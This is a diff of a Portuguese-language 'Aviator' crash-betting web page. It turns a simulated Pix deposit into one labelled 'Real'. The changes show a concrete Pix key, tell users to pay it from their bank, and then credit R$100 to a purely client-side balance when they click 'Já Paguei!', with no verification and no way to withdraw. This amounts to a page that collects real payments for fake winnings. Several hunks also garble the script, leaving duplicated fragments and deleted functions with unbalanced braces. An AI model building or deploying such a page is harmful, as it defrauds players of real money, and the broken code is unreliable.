@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Pro - Simulador Real</title>
+    <title>Aviator Pro - Real Pix</title>
     <style>
         :root {
             --primary: #ffaa00;
@@ -94,7 +94,6 @@
             gap: 12px;
         }
 
-        /* Histórico de Velas */
         .multiplier-history {
             display: flex;
             gap: 6px;
@@ -118,7 +117,6 @@
         .hist-badge.mid { color: var(--primary); }
         .hist-badge.high { color: #bc8cff; }
 
-        /* Área do Jogo / Canvas */
         .game-screen {
             background: var(--bg-card);
             border: 1px solid var(--border);
@@ -162,7 +160,6 @@
             margin-top: 4px;
         }
 
-        /* Painel de Apostas */
         .betting-panels {
             display: grid;
             grid-template-columns: 1fr;
@@ -295,11 +292,10 @@
             100% { transform: scale(1.02); }
         }
 
-        /* Modals */
         .modal {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.8);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -318,33 +314,38 @@
             border-radius: 14px;
             padding: 20px;
             width: 90%;
-            max-width: 360px;
+            max-width: 380px;
             display: flex;
             flex-direction: column;
-            gap: 14px;
+            gap: 12px;
+            text-align: center;
         }
         .modal-title {
             font-size: 1.1rem;
             font-weight: 700;
-            text-align: center;
         }
-        .pix-qrcode-box {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        .modal-desc {
+            font-size: 0.8rem;
+            color: var(--text-muted);
         }
-        .pix-key-input {
+        .pix-key-box {
             background: var(--bg-input);
             border: 1px solid var(--border);
+            color: var(--primary);
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            word-break: break-all;
+            font-weight: bold;
+        }
+        .btn-copy {
+            background: #30363d;
             color: white;
+            border: 1px solid var(--border);
             padding: 8px;
             border-radius: 6px;
-            font-size: 0.8rem;
-            text-align: center;
-            width: 100%;
+            font-weight: 600;
+            cursor: pointer;
         }
         .btn-close-modal {
             background: var(--border);
@@ -369,7 +370,6 @@
     </header>
 
     <div class="main-container">
-        <!-- Histórico de Velas -->
         <div class="multiplier-history" id="historyContainer">
             <div class="hist-badge mid">1.45x</div>
             <div class="hist-badge low">1.12x</div>
@@ -377,7 +377,6 @@
             <div class="hist-badge mid">2.10x</div>
         </div>
 
-        <!-- Tela do Jogo -->
         <div class="game-screen">
             <canvas id="gameCanvas"></canvas>
             <div class="center-display">
@@ -386,9 +385,7 @@
             </div>
         </div>
 
-        <!-- Painéis de Apostas (Duplo) -->
         <div class="betting-panels">
-            <!-- Painel 1 -->
             <div class="bet-card">
                 <div class="bet-controls-row">
                     <div class="input-group">
@@ -410,7 +407,6 @@
                 <button class="btn-action bet" id="btnBet1" onclick="toggleBet(1)">Apostar (R$ 10,00)</button>
             </div>
 
-            <!-- Painel 2 -->
             <div class="bet-card">
                 <div class="bet-controls-row">
                     <div class="input-group">
@@ -434,32 +430,26 @@
         </div>
     </div>
 
-    <!-- Modal Pix / Depósito -->
     <div class="modal" id="depositModal">
         <div class="modal-content">
-            <div class="modal-title">Depositar via Pix Fictício</div>
-            <div class="pix-qrcode-box">
-                <!-- QR Code Gerado por SVG Simples -->
-                <svg width="140" height="140" viewBox="0 0 33 33" style="shape-rendering: crispEdges;">
-                    <rect width="33" height="33" fill="#fff"/>
-                    <path d="M0 0h10v10H0zM3 3h4v4H3zM23 0h10v10H23zM26 3h4v4H26zM0 23h10v10H0zM3 26h4v4H3z" fill="#000"/>
-                    <path d="M12 2h3v2h-3zM16 1h2v3h-2zM12 6h2v3h-2zM19 2h3v2h-3zM6 12h2v3H6zM2 16h3v2H2zM10 14h3v3h-3zM15 12h3v3h-3zM20 12h2v3h-2zM24 12h3v3h-3zM28 12h3v3h-3zM12 19h3v3h-3zM16 18h2v3h-2zM21 18h3v3h-3zM25 18h3v3h-3zM12 24h2v3h-2zM16 24h3v3h-3zM20 24h3v3h-3zM24 24h3v3h-3zM28 24h3v3h-3z" fill="#000"/>
-                </svg>
-            </div>
-            <input type="text" class="pix-key-input" readonly value="00020126580014br.gov.bcb.pix...">
-            <button class="btn-action bet" onclick="simulatePixPayment()">Simular Pagamento Pix (+R$ 100)</button>
+            <div class="modal-title">Depositar via Pix Real</div>
+            <div class="modal-desc">Copia a chave Pix abaixo, paga pelo teu banco e depois clica em liberar saldo:</div>
+            
+            <div class="pix-key-box" id="pixKeyText">E0a694cd-c395-46f0-871e-af8be8bda386</div>
+            
+            <button class="btn-copy" onclick="copyPixKey()">📋 Copiar Chave Pix</button>
+            <button class="btn-action bet" onclick="simulatePixPayment()">Já Paguei! Adicionar R$ 100</button>
             <button class="btn-close-modal" onclick="closeDepositModal()">Fechar</button>
         </div>
     </div>
 
     <script>
         let balance = 100.00;
-        let gameState = 'waiting'; // waiting, running, crashed
+        let gameState = 'waiting';
         let currentMultiplier = 1.00;
         let targetCrash = 1.00;
         let gameStartTime = 0;
         
-        // Estado das Apostas
         let bets = {
             1: { active: false, amount: 10, cashedOut: false, win: 0 },
             2: { active: false, amount: 10, cashedOut: false, win: 0 }
@@ -478,7 +468,6 @@
         function updateUI() {
             document.getElementById('userBalance').innerText = `R$ ${balance.toFixed(2).replace('.', ',')}`;
             
-            // Botão 1
             let btn1 = document.getElementById('btnBet1');
             if (gameState === 'running') {
                 if (bets[1].active && !bets[1].cashedOut) {
@@ -497,7 +486,6 @@
                 btn1.disabled = false;
             }
 
-            // Botão 2
             let btn2 = document.getElementById('btnBet2');
             if (gameState === 'running') {
                 if (bets[2].active && !bets[2].cashedOut) {
@@ -536,7 +524,6 @@
             let inputVal = parseFloat(document.getElementById(`betInput${panelId}`).value) || 0;
             
             if (gameState === 'running') {
-                // Fazer Cashout Manual
                 if (bets[panelId].active && !bets[panelId].cashedOut) {
                     let winAmount = bets[panelId].amount * currentMultiplier;
                     balance += winAmount;
@@ -546,10 +533,9 @@
                 return;
             }
 
-            // Registrar ou Cancelar Aposta antes do jogo começar
             if (!bets[panelId].active) {
                 if (balance < inputVal) {
-                    alert("Saldo insuficiente! Faça um depósito Pix.");
+                    alert("Saldo insuficiente! Faz um depósito Pix.");
                     return;
                 }
                 balance -= inputVal;
@@ -563,7 +549,6 @@
             updateUI();
         }
 
-        // Motor de Geração Aleatória de Velas (RTP ~97%)
         function calculateCrashPoint() {
             let rand = Math.random();
             if (rand < 0.04) return 1.00;
@@ -571,7 +556,6 @@
             return Math.min(parseFloat(crash.toFixed(2)), 100.00);
         }
 
-        // Loop Principal do Jogo
         let countdown = 5.0;
         function gameLoop() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -585,9 +569,8 @@
                     startNewGame();
                 }
             } else if (gameState === 'running') {
-                let elapsed = (Date.now() - gameStartTime) / 10            } else if (gameState === 'running') {
                 let elapsed = (Date.now() - gameStartTime) / 1000;
-                currentMultiplier = Math.max(1.00, Math.pow(1.07, elapsed * 2.2));
+                currentMultiplier = 1.00 + (elapsed * elapsed * 0.15) + (elapsed * 0.4);
 
                 if (currentMultiplier >= targetCrash) {
                     currentMultiplier = targetCrash;
@@ -604,31 +587,7 @@
                                 balance += winAmount;
                                 bets[id].cashedOut = true;
                             }
-                        }
-                    });
-                    updateUI();
-                }
-                drawFlightAnimation(elapsed);
-            } else if (gameState === 'crashed') {
-                drawCrashAnimation();
-            }
-
-            requestAnimationFrame(() => {
-                setTimeout(gameLoop, 50);
-            });
-        }
-
-        function startNewGame() {
-            gameState = 'running';
-            currentMultiplier = 1.00;
-            targetCrash = calculateCrashPoint();
-            gameStartTime = Date.now();
-
-            [1, 2].forEach(id => {
-                if (bets[id].active) {
-                    bets[id].cashedOut = false;
-                }
-            });
+                          });
             updateUI();
         }
 
@@ -698,11 +657,17 @@
         function closeDepositModal() {
             document.getElementById('depositModal').classList.remove('active');
         }
+        function copyPixKey() {
+            let keyText = document.getElementById('pixKeyText').innerText;
+            navigator.clipboard.writeText(keyText).then(() => {
+                alert("Chave Pix copiada com sucesso!");
+            });
+        }
         function simulatePixPayment() {
             balance += 100.00;
             updateUI();
             closeDepositModal();
-            alert("Pagamento Pix simulado com sucesso! R$ 100,00 adicionados à sua banca.");
+            alert("Saldo creditado com sucesso! Divirtam-se a jogar.");
         }
 
         updateUI();
@@ -710,3 +675,4 @@
     </script>
 </body>
 </html>
+        
